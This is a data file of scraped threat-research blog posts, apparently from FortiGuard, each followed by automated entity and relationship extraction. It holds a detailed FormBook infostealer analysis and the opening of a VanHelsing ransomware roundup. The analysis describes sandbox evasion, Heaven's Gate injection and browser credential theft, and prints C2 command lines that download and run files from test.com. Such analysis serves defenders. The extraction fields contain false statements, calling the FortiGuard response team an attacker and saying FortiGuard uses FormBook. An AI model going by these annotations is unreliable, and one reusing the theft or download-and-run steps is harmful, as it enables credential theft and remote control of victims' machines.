Copyright © 2025 Fortinet, Inc. All Rights Reserved",
    "extraction": {
      "raw_output": "Named Entities: (FortiGuard Labs Threat Research, Entity), (incident investigation, Activity), (FortiGuard Incident Response Team, Attacker), (malware, Malware), (dllhost.exe, Process), (pid.8200.vad.0x1c3eefb0000-0x1c3ef029fff.dmp, File), (Windows Loader, Tool), (PE, File), (dos, DOS), (pe, PE), (address range, Range), (researchers, Target)\nRelationships: (FortiGuard Labs Threat Research, analyzes, incident investigation), (incident investigation, leads, FortiGuard Incident Response Team), (malware, runsIn, dllhost.exe), (dllhost.exe, hasPID, pid.8200.vad.0x1c3eefb0000-0x1c3ef029fff.dmp), (dllhost.exe, processes, pid.8200.vad.0x1c3eefb0000-0x1c3ef029fff.dmp), (dllhost.exe, loadsAndDeploys, Windows Loader), (Windows Loader, readsAndParsesHeaders, dos), (Windows Loader, deploys, PE), (Windows Loader, noLongerNeededAfterDeployment, PE), (Windows Loader, evadesDumpingIntoFileForAnalysis",
      "entities": [
        [
          "FortiGuard Labs Threat Research",
          "Entity"
        ],
        [
          "incident investigation",
          "Activity"
        ],
        [
          "FortiGuard Incident Response Team",
          "Attacker"
        ],
        [
          "malware",
          "Malware"
        ],
        [
          "dllhost.exe",
          "Process"
        ],
        [
          "pid.8200.vad.0x1c3eefb0000-0x1c3ef029fff.dmp",
          "File"
        ],
        [
          "Windows Loader",
          "Tool"
        ],
        [
          "PE",
          "File"
        ],
        [
          "dos",
          "DOS"
        ],
        [
          "pe",
          "PE"
        ],
        [
          "address range",
          "Range"
        ],
        [
          "researchers",
          "Target"
        ]
      ],
      "relationships": [
        [
          "FortiGuard Labs Threat Research",
          "analyzes",
          "incident investigation"
        ],
        [
          "incident investigation",
          "leads",
          "FortiGuard Incident Response Team"
        ],
        [
          "malware",
          "runsIn",
          "dllhost.exe"
        ],
        [
          "dllhost.exe",
          "hasPID",
          "pid.8200.vad.0x1c3eefb0000-0x1c3ef029fff.dmp"
        ],
        [
          "dllhost.exe",
          "processes",
          "pid.8200.vad.0x1c3eefb0000-0x1c3ef029fff.dmp"
        ],
        [
          "dllhost.exe",
          "loadsAndDeploys",
          "Windows Loader"
        ],
        [
          "Windows Loader",
          "readsAndParsesHeaders",
          "dos"
        ],
        [
          "Windows Loader",
          "deploys",
          "PE"
        ],
        [
          "Windows Loader",
          "noLongerNeededAfterDeployment",
          "PE"
        ]
      ],
      "has_entities": true
    },
    "entity_count": 12,
    "relationship_count": 9
  },
  {
    "title": "Infostealer Malware FormBook Spread via Phishing Campaign – Part II",
    "link": "https://www.fortinet.com/blog/threat-research/infostealer-malware-formbook-spread-via-phishing-campaign",
    "content": "FortiGuard Labs Threat Research Affected platforms:Microsoft WindowsImpacted parties:Windows UsersImpact:Fully remotely control the victim’s computerSeverity level:High This is part II of the FormBook analysis blog. In the previous post (Part I), I covered the campaign’s initialization via a phishing email, the CVE-2017-11882 vulnerability it exploited to execute an extracted 64-bit DLL, and the download and decryption of a FormBook variant hidden in a fake PNG file. Finally, I elaborated on how the 64-bit DLL mapped the FormBook payload in a target process (ImagingDevices.exe) and executed it using the process hollowing technique. 2025 Global Threat Landscape Report Use this report to understand the latest attacker tactics, assess your exposure, and prioritize action before the next exploit hits your environment. In the second part of this analysis, you will learn how the FormBook payload operates on a comprised machine, including the complicated anti-analysis techniques employed by this FormBook variant, how the FormBook leverages Heaven’s Gate and randomly selected processes to evade analysis by cybersecurity researchers, the sensitive data it collects from the victim’s machine, how it communicates with the C2 server, and how it controls the victim’s system with control commands. The FormBook payload is a 32-bit executable that runs inside the 32-bit target process “ImagingDevices.exe”. My analysis reveals that the copied FormBook is re-encrypted. The code initially executed does not belong to the real FormBook but instead serves as a decryption routine. The encrypted data begins at offset 0x6E36C3 (with FormBook loaded at 0x6E0000), and the encrypted data size is hard coded to 0x43600, as illustrated in Figure 1. Next, it calculates the real entry point address from the decrypted code and stores it in the ESI register. This address will be called at the final stage, as shown in Figure 2. FormBook leverages multiple techniques to prevent being analyzed. I explain the main techniques used in this variant below. Figure 4 shows how it calls the ZwOpenDirectoryObject() API (0x2FE3580) inside the duplicated ntdll.dll. In my analysis environment, the original address for the API should be 0x76F43580. This is a module list loaded dynamically by FormBook by their index. Index Module Name 0x1 \"kernel32.dll\" 0x2 \"advapi32.dll\" 0x3 \"ws2_32.dll\" 0x4 \"rstrtmgr.dll\" 0x5 \"sqlite3.dll\" 0x6 \"winsqlite3.dll\" 0x7 \"crypt32.dll\" 0x8 \"vaultcli.dll\" 0x9 \"ole32.dll\" 0xA \"nss3.dll\" 0xB \"user32.dll\" 0xC \"shell32.dll\" FormBook then passes the decrypted module name to a function to load it using a low-level Windows API function, LdrLoadDll(). The desired Windows APIs are not hardcoded strings in FormBook but encrypted hash codes. FormBook traverses the APIs inside the loaded modules and matches their hash codes with the decrypted ones to find the desired APIs. As you can see in Figure 5, the PostThreadMessageW() API was obtained inside the EAX register from the “user32.dll” module. In this variant of FormBook, more than 100 key functions are encrypted by default and are decrypted only before calling. They are then re-encrypted after calling, which presents a challenge for static analysis. As shown on the left side of Figure 6, the SearchDecryptCode() function is called to search the encrypted code by locating the given start magic (6 bytes) and end magic (6 bytes). It then decrypts the located code. At 0x709B15, it calls sub_70DC33(), whose body is shown on the right side. The instructions enclosed by the red rectangle were just decrypted. After executing the dynamic function (sub_70DC33()), it calls ReEncryptCode(), at 0x709B26, to re-encrypt the function. To protect FormBook from being analyzed by auto-analysis platforms, it performs multiple detections. 1. Virtual Machines and Analysis Tools FormBook contains a predefined blacklist of encrypted hash codes, which are generated from process names associated with popular VM platforms or analysis tools, such as VMware (vmwareuser.exe, vmwareservice.exe), Sandboxie (sandboxiedcomlaunch.exe, sandboxierpcss.exe), Sysinternals tools (procmon.exe, regmon.exe, filemon.exe), network sniffers (wireshark.exe, netmon.exe), automation scripts (python.exe, perl.exe), and more. It retrieves all active processes from the victim’s system, generates a hash code from their process names, and compares them with a predefined set of blacklisted hash codes. The following code snippet demonstrates how it decrypts a hash code from 0x72FE2A27, which is 0x3EBE9086 generated from “vmwareuser.exe”. …… 006F642Aleaecx, [ebp+Dest]; Current process name. 006F6430pushecx 006F6431push3Ah; Decryption key. 006F6433push72FE2A27h; Encrypted hash code. 006F6438calldecrypt_fun; Decrypts a hash code. 006F643Daddesp, 8 006F6440pusheax; EAX holds the decrypted hash code, 0x3EBE9086, which is generated from “vmwareuser.exe”. 006F6441callmatch_hashcode; Compares with the current process. 006F6446addesp, 8 006F6449testeax, eax 006F644Bjnzanalysis_detected …… Once matched, it sets a global flag indicating it’s running in an analysis environment. 2. Detecting Sandbox Environments Some auto-analysis sandboxes run the target process from specific folders. FormBook detects this by retrieving the full path of the target process it hollowed into. In my analysis machine, it’s: “C:\\Program Files (x86)\\Windows Photo Viewer\\ImagingDevices.exe”. It then checks if the parent folder contains keywords from a blacklist by matching their hash codes. Examples include: “\\cuckoo\\”, “\\sandcastle\\”, “\\aswsnx\\”, “\\sandbox\\”, “\\smpdir\\”, “\\samroot\\”, and “\\avctestsuite\\” Below is an example of full path triggers detection: “C:\\cuckoo\\Windows Photo Viewer\\ImagingDevices.exe” 3. Windows Account Name It calls the Windows API RtlQueryEnvironmentVariable_U() with “USERNAME” as the variable name to retrieve the victim’s username. Figure 7 demonstrates the retrieved username after calling the API. It then generates a hash code from the username and compares it with those in a blacklist. FormBook assumes the usernames starting with certain patterns (e.g., “cuckoo”, “sandbox-“, “nmsdbox-“, and more) belong to auto-analysis systems. All of the above detection results are stored in global flags. FormBook checks these flags in a function and exits the process if any of them is set. It checks if a kernel-mode debugger (like Windbg) is enabled by calling the API NtQuerySystemInformation() with SystemKernelDebuggerInformation(0x23) system information class. Refer to Figure 8 for more details. If the KernelDebuggerEnabled is 1, it means a kernel debugger is present. It also determines if the user-mode debugger is present by passing ProcessDebugPort (0x7) as a ProcessInformationClass parameter to the ZwQueryInformationProcess() API. It returns 0xFFFFFFFF if a user-mode debugger is attached, such as x32dbg, which I used during the analysis. The Heaven’s Gate technique is a mechanism on Windows x64 systems that allows switching from 32-bit to 64-bit code inside a 32-bit process. It is also known as WoW64 (Windows-on-Windows 64-bit). This transition is the essence of “Heaven’s Gate.” The mechanism presents a significant challenge to cybersecurity researchers because a 32-bit debugger cannot debug 64-bit code, interrupting the debugging process. The Windows x64 architecture determines the execution mode based on the CS (Code Segment) register. In user mode (ring 3), 0x23 corresponds to the 32-bit code segment, while 0x33 corresponds to the 64-bit code segment. Executing an instruction like “jmp far 0x33:{address}” in a 32-bit process switches to 64-bit mode and executes 64-bit code from the {address}. This variant of FormBook uses the Heaven’s Gate technique multiple times, which will be explained in the following sections. FormBook randomly selects one of the explorer.exe child processes from active processes and leverages the Heaven’s Gate technique to manipulate the selected process. The malware first calls the NtQuerySystemInformation() API with the SystemProcessInformation (0x5) parameter to enumerate all active processes. It locates the PID (Process ID) of explorer.exe by comparing process name hash codes. Next, it scans the active processes to randomly choose a child process of explorer.exe by matching the active processes’ PPID (Parent Process ID) with the explorer.exe’s PID (Figure 9). After obtaining the process handle of the selected process (e.g., notepad.exe) by calling the NtOpenProcess() API, FormBook creates a shared memory between the two processes and copies the shellcode: It then utilizes the Heaven’s Gate technique to execute a piece of 64-bit code that had been copied and deployed in a newly allocated buffer. Figure 10 is about to execute “jmp far 33:2F30000”, where 0x33 is the new CS and 0x2F30000 is the new buffer’s address with the copied 64-bit code, as shown in the memory. Upon completion, it returns to 23:7107C0, which has already been pushed onto the top of the stack. My analysis reveals that the 64-bit code takes control of the selected process’s main thread (like notepad.exe) to execute a piece of injected malicious code. To control the selected process, it calls the NtOpenProcess() and ZwQueryInformationProcess() APIs to retrieve the process’ details. The APIs ZwOpenThread() and ZwSuspendThread() are called to pass the selected process’ information to suspend the main thread inside the selected process. In Figure 11, we can see that the 64-bit code just called ZwSuspendThread(), and in another debugger attached to the chosen process, it displays the suspended main thread. Subsequently, the 64-bit code copies the malicious payload into the selected process over the shared memory. It then calls NtGetContextThread() and NtSetContextThread() to modify the RIP register, redirecting the execution to the injected code. Finally, it calls the NtResumeThread() API to resume the main thread, causing the malicious code to run inside the selected process, notepad.exe. Execution then returns to the 32-bit code by executing a “retf” instruction. This time, the selected child process of explorer.exe is a Notepad.exe with the PID 9560. The copied malicious code is the same as the 64-bit code mentioned earlier, but it goes down different code branches depending on a returned flag. Twelve encrypted process names are saved in local variables, which can be obtained using a function with a string index. The table below lists all the processes and indexes. String Index Process Names 0x0 \"PATHPING.EXE\" 0x1 \"fontview.exe\" 0x2 \"MuiUnattend.exe\" 0x3 \"forfiles.exe\" 0x4 \"chkntfs.exe\" 0x5 \"find.exe\" 0x6 \"DpiScaling.exe\" 0x7 \"waitfor.exe\" 0x8 \"net.exe\" 0x9 \"icsunattend.exe\" 0xa \"cttune.exe\" 0xb \"whoami.exe\" These 32-bit processes all reside in the “C:\\Windows\\SysWOW64\\” folder. FormBook repeatedly launches these processes in a loop until one is successfully created. It then performs process hollowing on the process, injects the FormBook payload into the process (such as “PATHPING.EXE”), and executes it. As shown in Figure 12, it is about to call the CreateProcessInternalW() API to create a PATHPING.EXE process, with the dwCreationFlags parameter set to 0x800000C, indicating a suspended process will be created. It then creates a shared memory section between notepad.exe and PATHPING.EXE. At this point, the task of the code running in the selected process (notepad.exe) is completed. Switching to the target process (ImagingDevices.exe), it returns to the 32-bit code mode from the 64-bit code via Heaven’s Gate. It brings the full process information of the newly created PATHPING.EXE process using the shared memory established between it and the selected notepad.exe process. ImagingDevices.exe takes control of the PATHPING.EXE process and copies the FormBook payload into the PATHPING.EXE process via the shared memory section. As shown in Figure 14, the payload is encrypted and mapped into both processes’ memory, having been written by code running inside ImagingDevices.exe. Next, ImagingDevices.exe calls the NtSetContextThread() API to modify the PATHPING.EXE’s EAX register (which holds a thread function address to RtlUserThreadStart().) to redirect the execution to a specific function. This function decrypts the FormBook payload and calls the entry point function of the FormBook payload once the NtResumeThread() API is called. After employing numerous evasion techniques, FormBook finally hits the main payload within the PATHPING.EXE process, another 32-bit process. Based on my analysis, this process function acts as a dashboard program for FormBook. It gathers sensitive data from the victim’s system and manipulates another selected process to communicate with its C2 server. FormBook collects basic information from the victim’s device, such as the Windows product name, the current build, the username, and the computer name. Some are obtained from the system registry via API calls, while others are retrieved using the RtlQueryEnvironmentVariable_U() API. This information is then encrypted and saved in a global variable, which is later sent to the C2 server in an HTTP GET packet to register the infected system. As shown in Figure 15, the malware prepares to encrypt the collected basic information, where “XLNG…” is a magic string, “Windows 10 Enterprise x64” is the Windows product information, followed by the Base64-encoded computer name and user name. FormBook then randomly selects another child process of explorer.exe. Similar to what was done in the ImagingDevices.exe process, it invokes 64-bit code from the 32-bit process using the Heaven’s Gate technique. This 64-bit code copies and deploys the FormBook into the newly selected process (e.g., another notepad.exe process) and modifies the RIP register to point to the deployed FormBook at a different entry point. According to my analysis, this newly selected process acts as a socket process responsible for communicating with the C2 server. A large shared memory section is created and mapped into PATHING.EXE and the chosen data exchange process. When it returns to 32-bit mode (using Heaven’s Gate) in the PATHPING.EXE process, FormBook calls the PostThreadMessageW() API with a Msg parameter of 0x111 (WM_COMMAND) to send a message to the main thread of the selected process (like notepad.exe), as shown in Figure 16. Instead of calling NtResumeThread() to resume thread execution, FormBook sends a Windows message to activate the payload. Why does it send a message to run the FormBook as a socket process? As we know, most Windows programs are driven by Windows messages. Most of the time, a program remains idle because the message queue is empty—there is no user interaction (mouse, keyboard, etc.), system events, or other messages. The program waits (blocked by the NtUserGetMessage() API) until a new message arrives. If FormBook modifies the value of the RIP register to point to the copied FormBook payload and then proactively sends a message to the process, it can then hijack the original execution flow and redirect it to run the FormBook payload instead. The FormBook instance in PATHPING.EXE also acts as a daemon, monitoring the socket process. Once the victim terminates the socket process, FormBook immediately selects another child process of explorer.exe to take its place. The FormBook instance running in PATHPING.EXE harvests sensitive data from the compromised system, such as saved credentials of various software, autofill data, cookies, proxy settings for browsers, and data from the system clipboard. FormBook can also obtain sensitive data from multiple resources, such as the system registry and the local profile files. For example, it extracts the autofill data for the IE browser from the key path “HKCU\\SOFTWARE\\Microsoft\\Internet Explorer\\IntelliForms\\Storage2” in the system registry. It also collects email account information from Outlook by scanning the following key paths in the system registry to cover multiple Outlook versions: When gathering sensitive data from Chrome, FormBook accesses some SQLite database format files located in “%LocalData%\\Google\\Chrome\\User Data\\Login Data\\Default\\”, explicitly targeting these files: “Login Data” (credentials), “Cookies” (web site cookies), “Web Data” (autofill), and “Network” (proxy setting). This is accomplished through a series of winsqlite3.dll API calls, including sqlite3_open(), sqlite3_prepare_v2(), sqlite3_step(), sqlite3_column_text(), sqlite3_column_blob(), sqlite3_column_bytes(), and sqlite3_close(). Figure 17 demonstrates Chrome credential extraction, showing FormBook executing the SQL query “SELECT origin_url, username_value, password_value FROM logins” via the sqlite3_prepare_v2() API. The sample credentials, shown at the bottom, were just obtained from a Chrome browser in a test environment. The malware maintains the capability to collect similar sensitive data from a wide range of additional applications. Below are the categorized software applications from which FormBook can collect sensitive data: Email Clients: Outlook, Thunderbird, and Foxmail. Web Browsers: Internet Explorer, Chrome, Firefox, Edge, Brave-Browser, Opera Neon, ChromePlus, Avast Secure Browser, Yandex Browser, Citrio, Sleipnir 5, Epic Privacy Browser, Elements Browser, 360 Chrome, CCleaner Browser, Sputnik, Cốc Cốc Browser, Opera, Uran, Coowon Browser, Comodo Dragon, AVG Secure Browser, CentBrowser, 7Star Browser, UR Browser, SalamWeb, QIP Surf, Chromium, Iridium Browser, Slimjet, Vivaldi, Orbitum, Liebao, Kometa Browser, Chedot, Torch Browser, Amigo, Kinza, and Blisk, Let’s now examine the socket process (another selected process, like notepad.exe) that handles communication with the Command-and-Control (C2) server in the background. The C2 domain list in this variant of FormBook is not stored in plaintext. Instead, it undergoes a multi-layered obfuscation process. Each domain is encrypted, encoded using Base64, and then encrypted again. This technique adds significant complexity to static analysis and helps evade detection. This variant has 64 C2 domains, which are dynamically retrieved in the socket process by referencing a one-byte index. The decrypted domains only exist temporarily in memory during runtime, making them more elusive. For the complete list of C2 domains, refer to the IOCs section at the end of this report. Figure 18 shows the socket process after successfully decrypting a C2 server domain from memory. The decrypted domain is “www[.]manicure-nano[.]sbs,” corresponding to index 0x2B, with the associated URL “/xkx8/”. A shared memory section is created between PATHPING.EXE and the socket process (like notepad.exe), which is used to share: Another responsibility of the socket process is to gather system clipboard data. FormBook performs this by running a thread calling the relevant APIs: OpenClipboard(), GetClipboardData(), GlobalLock(), GlobalUnlock(), and CloseClipboard(). The collected clipboard data is also stored in shared memory. Within the socket process, FormBook starts a specific thread to repeatedly check if a flag is set by PATHPING.EXE that tells if the collected data is ready to send. Once the flag is triggered, FormBook transmits the collected data using HTTP GET and POST. Based on my analysis, basic system information is sent via GET, and other data is sent via POST. As shown in Figure 19, execution breaks at a function call (located at 0x1F08625B1D1) that is responsible for encrypting collected credentials—retrieved from Mozilla Firefox in this instance—in the memory dump before sending them to the C2 server. To evade detection during transmission, FormBook encrypts and encodes the data before sending it out. Each C2 server has its own unique 0x14-byte-long encryption key seed hardcoded in memory. The data undergoes two layers of encryption. It first uses a common predefined key to encrypt the data, then uses the C2 server’s own encryption key to encrypt it again. After this double encryption, FormBook encodes the data using the standard base64 algorithm. Figure 20 shows a screenshot of an HTTP Post packet in Wireshark, illustrating how FormBook sends collected data to a C2 server. The URL in this case is www[.]grcgrg[.]net/jxyu/. The encrypted data is located in the body portion of the POST request, prefixed with a randomly generated string, “30J0cVz=”. As mentioned before, when the socket process receives a command packet from the C2 server, it saves it in shared memory and sets a corresponding flag. This informs the FormBook instance running in the PATHPING.EXE to process the C2 command. All incoming packets from the C2 server are multi-layer encrypted and Base64-encoded. Once received, the PATHPING.EXE instance decrypts and decodes the packets before interpretation. A decrypted packet format looks like this: “XLNG{command ID}{command data}{XLNG}” FormBook Control Commands: 1.     ‘1’ – 0x31: This command delivers three kinds of executable files within the packet: *.dll, *.ps1, and *.exe. Once this command is received, FormBook saves the file into the system %temp% directory and then executes it on the victim’s system. 2.     ‘2’ – 0x32: This command can be used to update the FormBook or execute other malware. FormBook receives a 32-bit EXE file in the packet and saves it into a randomly generated temp file within the system. After that, it executes the EXE file by invoking the CreateProcessInternalW() API. As shown in Figure 21, it just wrote the 32-bit EXE data into a temp file, such as “%temp%\\yzbtfb3.exe.” It finally calls ExitProcess() to exit the current FormBook process (PATHPING.EXE). 3.     ‘3’ – 0x33: This command is used to remove FormBook from the victim’s system. It deletes Formbook's file and Auto-run items from the system registry and exits the current FormBook instance. It also restarts the Explorer.exe process. 4.     ‘4’ – 0x34: When FormBook receives this command, it downloads an executable file from a given URL that comes with the packet if a subcommand is provided. Otherwise, it only executes a given command. This variant of FormBook provides two sub-commands: Below are three cases that demonstrate how the ‘4’ command works. Without sub-command: XLNG4cmd.exeXLNG RMTD sub-command: XLNG4RMTD:http://test.com/test.exeXLNG RMTU sub-command: XLNG4RMTU:http://test.com/test.ps1XLNG FormBook downloads the file into a randomly named file under the system’s %temp% folder. It calls a series of APIs to do so, such as InternetOpenW(), InternetConnectW(), HttpOpenRequestW(), HttpSendRequestW(), InternetQueryDataAvailable(), and InternetReadFile(). Finally, FormBook calls ShellExecuteA to execute the downloaded file in the compromised system. If no sub-commend is provided in the command data, it means the command data is not a URL, which can be executed directly by calling the ShellExecuteA() API. Figure 22 provides an example with a simulated control command packet, which was about to call an API to launch “C:\\Windows\\system32\\mspaint.exe”. 5.     ‘5’ – 0x35: This command allows FormBook to clean sensitive data saved on the victim's browsers, such as cookies, credentials, and more. It also deletes some folders and files from the compromised system by calling the SHFileOperationW() API. The affected paths are: • \"%WinDir%\\Cookies\"• \"%AppData%\\Microsoft\\Windows\\Cookies\"• \"%AppData%\\Microsoft\\Windows\\Cookies\\Low\"• \"%LocalAppData%\\Microsoft\\Windows\\INetCookies\"• \"%LocalAppData%\\Microsoft\\Windows\\INetCookies\\Low\"• \"%LocalAppData%\\Google\\Chrome\\User Data\\Default\\Login Data\"• \"%LocalAppData%\\Google\\Chrome\\User Data\\Default\\Cookies\"• \"%LocalAppData%\\Google\\Chrome\\User Data\\Default\\Current Session\"• \"%APPDATA%\\Mozilla\\Firefox\\Profiles\\{ProfileName}\\Cookies.sqlite\" 6.     ‘6’ – 0x36: This command instructs FormBook to collect sensitive data that will be sent to the C2 server, as explained in the “Collect Sensitive Data” section above. 7.     ‘7’ – 0x37: Reboots the victim’s device. Formbook calls the API ExitWindowsEx() with the EWX_FORCEIFHUNG | EWX_REBOOT parameter to reboot the system. 8.     ‘8’ – 0x38: Powers off the victim’s device. Formbook calls the API ExitWindowsEx() with the EWX_FORCEIFHUNG | EWX_POWEROFF parameter to power off the system. 9.     ‘9’ – 0x39: In this variant, the command corresponds to an empty function. In this second part of the FormBook blog series, I explained how the FormBook payload operates within the 32-bit target process, “ImagingDevices.exe.” Figure 23 provides an overview of the entire workflow executed by the payload. I also showed the various complicated anti-analysis techniques used by this FormBook variant, including—but not limited to—a hidden ntdll.dll module, API obfuscation, more than 100 encrypted key functions, anti-sandbox techniques, anti-debugging, and the repeated use of Heaven’s Gate techniques. I then explained how FormBook randomly selects a process from active processes and takes control of it using the Heaven’s Gate technique. Its main objective is to perform process hollowing on the selected process (say PATHPING.EXE), inject FormBook into the process, and execute it as a dashboard. Once running, FormBook collects a wide range of sensitive data from the victim’s system, including, but not limited to, basic system information, saved credentials, cookie data, autofill data, browser history, and more. Next, I described how the C2 server list in this FormBook variant is decrypted and decoded, and how stolen sensitive data is formatted and transmitted in network packets. Finally, I examined FormBook’s nine control commands, which enable a wide array of capabilities, such as executing provided executable files, launching an existing file, downloading and executing EXE, DLL, and PS1 files, and remotely rebooting or shutting down the victim’s machine. Fortinet customers are already protected from this campaign with FortiGuard’s AntiSPAM, Web Filtering, IPS, and AntiVirus services as follows: The FortiGuard’s Anti-Botnet Service has blocked the DNS requests for accessing FormBook’s C2 server. The C2 server list is rated as “Malicious Websites” by the FortiGuard Web Filtering service. FortiGate, FortiMail, FortiClient, and FortiEDR support the FortiGuard AntiVirus service. The FortiGuard AntiVirus engine is part of each solution. As a result, customers who have these products with up-to-date protections are already protected. You can sign up to receive future alerts and stay informed of new and emerging threats. We also suggest our readers go through the freeNSE training:NSE 1 – Information Security Awareness, a module on Internet threats designed to help end users learn how to identify and protect themselves from phishing attacks. If you believe this or any other cybersecurity threat has impacted your organization, please contact ourGlobal FortiGuard Incident Response Team. hxxp://www[.]arwintarim[.]xyz/shoy/hxxp://www[.]promutuus[.]xyz/bpae/hxxp://www[.]218735[.]bid/3f5o/hxxp://www[.]vivamente[.]shop/xr41/hxxp://www[.]segurooshop[.]shop/wcz8/hxxp://www[.]hugeblockchain[.]xyz/1dpy/hxxp://www[.]crazymeme[.]xyz/78bm/hxxp://www[.]extremedoge[.]xyz/372c/hxxp://www[.]685648[.]wang/3k4m/hxxp://www[.]shibfestival[.]xyz/8538/hxxp://www[.]promoconfortbaby[.]store/1pxl/hxxp://www[.]balivegasbaru2[.]xyz/cfze/hxxp://www[.]themutznuts[.]xyz/ks15/hxxp://www[.]kpilal[.]info/9o26/hxxp://www[.]dogeeditor[.]xyz/x5dz/hxxp://www[.]adjokctp[.]icu/3ya5/hxxp://www[.]kasun[.]wtf/u4ue/hxxp://www[.]031235246[.]xyz/ml07/hxxp://www[.]intention[.]digital/h6z3/hxxp://www[.]prepaidbitcoin[.]xyz/rcx4/hxxp://www[.]ddvids[.]xyz/uiki/hxxp://www[.]zhuanphysical[.]shop/zcro/hxxp://www[.]theweb[.]services/fb40/hxxp://www[.]sdwd[.]wang/sfv4/hxxp://www[.]lucynoel6465[.]shop/1i64/hxxp://www[.]nhc7tdkp6[.]live/d9kr/hxxp://www[.]ciptaan[.]xyz/fjwa/hxxp://www[.]gluconolmx[.]shop/8370/hxxp://www[.]shlomi[.]app/5nwk/hxxp://www[.]garfo[.]xyz/35rt/hxxp://www[.]caral[.]tokyo/plub/hxxp://www[.]meritking[.]cloud/gakd/hxxp://www[.]grcgrg[.]net/jxyu/hxxp://www[.]nullus[.]xyz/pf7y/hxxp://www[.]actionlow[.]live/0a0g/hxxp://www[.]dangky88kfree[.]online/11lg/hxxp://www[.]szty13[.]vip/abhi/hxxp://www[.]arryongro-nambe[.]live/h108/hxxp://www[.]dqvcbn[.]info/iby8/hxxp://www[.]svapo-discount[.]net/s956/hxxp://www[.]yueolt[.]shop/je6k/hxxp://www[.]sigaque[.]today/u2nq/hxxp://www[.]manicure-nano[.]sbs/xkx8/hxxp://www[.]laohuc58[.]net/zyjq/hxxp://www[.]iighpb[.]bid/jfhd/hxxp://www[.]fjlgyc[.]info/txra/hxxp://www[.]sbualdwhryi[.]info/dbdy/hxxp://www[.]xrrkkv[.]info/eg97/hxxp://www[.]08081[.]pink/2wr9/hxxp://www[.]jyc11[.]top/xz2s/hxxp://www[.]kdjsswzx[.]club/h3ut/hxxp://www[.]gnlokn[.]info/lmor/hxxp://www[.]btbjpu[.]info/pjhe/hxxp://www[.]bellysweep[.]net/gr1r/hxxp://www[.]dilgxp[.]info/7qht/hxxp://www[.]leveledge[.]sbs/asbs/hxxp://www[.]ethereumpartner[.]xyz/xou3/hxxp://www[.]choujiezhibo[.]net/pu7t/hxxp://www[.]domuss[.]asia/yf4f/hxxp://www[.]seasay[.]xyz/xwy3/hxxp://www[.]tumbetgirislinki[.]fit/i8hk/hxxp://www[.]ef4refef[.]sbs/f88b/hxxp://www[.]aicycling[.]pro/4m7q/hxxp://www[.]autonomousrich[.]xyz/iej0/ malware FortiGuard Labs Threat Research FortiGuard Labs Threat Research FortiGuard Labs Threat Research Copyright © 2025 Fortinet, Inc. All Rights Reserved",
    "extraction": {
      "raw_output": "Named Entities: (FortiGuard Labs Threat Research, Entity), (Microsoft Windows, Platform), (Windows Users, Impact), (fully remotely control the victim’s computer, Severity level), (FormBook, Threat Type), (Heaven's Gate, Technique), (C2 server, IP), (Control command, Technique)\nRelationships: (FortiGuard Labs Threat Research, affectedPlatforms, Microsoft Windows), (FortiGuard Labs Threat Research, impactedBy, Windows Users), (FortiGuard Labs Threat Research, severityLevel, fully remotely control the victim’s computer), (FortiGuard Labs Threat Research, uses, FormBook), (FortiGuard Labs Threat Research, communicatesWith, C2 server), (FortiGuard Labs Threat Research, uses, Control command), (FormBook, uses, Heaven's Gate), (FormBook, executes, ImgingDevices.exe), (FormBook, copies, FormBook), (FormBook, reEncrypts, Code), (Code, initialExecution, Executable), (Executable, runsIn, ImagingDevices.exe)",
      "entities": [
        [
          "FortiGuard Labs Threat Research",
          "Entity"
        ],
        [
          "Microsoft Windows",
          "Platform"
        ],
        [
          "Windows Users",
          "Impact"
        ],
        [
          "fully remotely control the victim’s computer",
          "Severity level"
        ],
        [
          "FormBook",
          "Threat Type"
        ],
        [
          "Heaven's Gate",
          "Technique"
        ],
        [
          "C2 server",
          "IP"
        ],
        [
          "Control command",
          "Technique"
        ]
      ],
      "relationships": [
        [
          "FortiGuard Labs Threat Research",
          "affectedPlatforms",
          "Microsoft Windows"
        ],
        [
          "FortiGuard Labs Threat Research",
          "impactedBy",
          "Windows Users"
        ],
        [
          "FortiGuard Labs Threat Research",
          "severityLevel",
          "fully remotely control the victim’s computer"
        ],
        [
          "FortiGuard Labs Threat Research",
          "uses",
          "FormBook"
        ],
        [
          "FortiGuard Labs Threat Research",
          "communicatesWith",
          "C2 server"
        ],
        [
          "FortiGuard Labs Threat Research",
          "uses",
          "Control command"
        ],
        [
          "FormBook",
          "uses",
          "Heaven's Gate"
        ],
        [
          "FormBook",
          "executes",
          "ImgingDevices.exe"
        ],
        [
          "FormBook",
          "copies",
          "FormBook"
        ],
        [
          "FormBook",
          "reEncrypts",
          "Code"
        ],
        [
          "Code",
          "initialExecution",
          "Executable"
        ],
        [
          "Executable",
          "runsIn",
          "ImagingDevices.exe"
        ]
      ],
      "has_entities": true
    },
    "entity_count": 8,
    "relationship_count": 12
  },
  {
    "title": "Ransomware Roundup – VanHelsing",
    "link": "https://www.fortinet.com/blog/threat-research/ransomware-roundup-vanhelsing",
    "content": "FortiGuard Labs Threat Research FortiGuard Labs gathers data on ransomware variants of interest that have been gaining traction within our datasets and the OSINT community. The Ransomware Roundup report aims to provide readers with brief insights into the evolving ransomware landscape and the Fortinet solutions that protect against those variants. This edition of the Ransomware Roundup covers the VanHelsing ransomware. Affected platforms:Microsoft WindowsImpacted parties:Microsoft WindowsImpact:Encrypts victims' files and demands a ransom for file decryptionSeverity level:High 2025 Global Threat Landscape Report Use this report to understand the latest attacker tactics, assess your exposure, and prioritize action before the next exploit hits your environment. The first sample of the VanHelsing ransomware was made available on a publicly available file-scanning site in mid-March 2025. Like other ransomware attacks, VanHelsing demands a ransom to decrypt files via dropped ransom notes. Information on the infection vector used by the VanHelsing ransomware threat actor is unavailable. However, it is not likely to differ significantly from other ransomware groups. When run, the VanHelsing ransomware (SHA2: 99959C5141F62D4FBB60EFDC05260B6E956651963D29C36845F435815062FD98) takes the following command line arguments: The VanHelsing ransomware then encrypts files on the compromised machines and adds the file extension “.vanlocker” to affected files. Note that although this VanHelsing variant (SHA2: 99959C5141F62D4FBB60EFDC05260B6E956651963D29C36845F435815062FD98) uses “.vanlocker” as its extension, it still belongs to the VanHelsing ransomware family because it uses the same ransom negotiation and data leak sites as another VanHelsing variant. (SHA2: 86d812544f8e250f1b52a4372aaab87565928d364471d115d669a8cc7ec50e17) This other variant adds a “.vanhelsing” file extension to the files it encrypts. The VanHelsing ransomware exempts the following files: boot.ini autofun.inf bootfont.bin bootsect.bak desktop.ini ntldr ntuser.dat ntuser.dat.log ntuser.ini thumb.db GDIPFONTCACHEV1.DAT iconcache.db d3d9caps.dat LOGS.txt README.txt It also avoids encrypting files with the following file extensions: 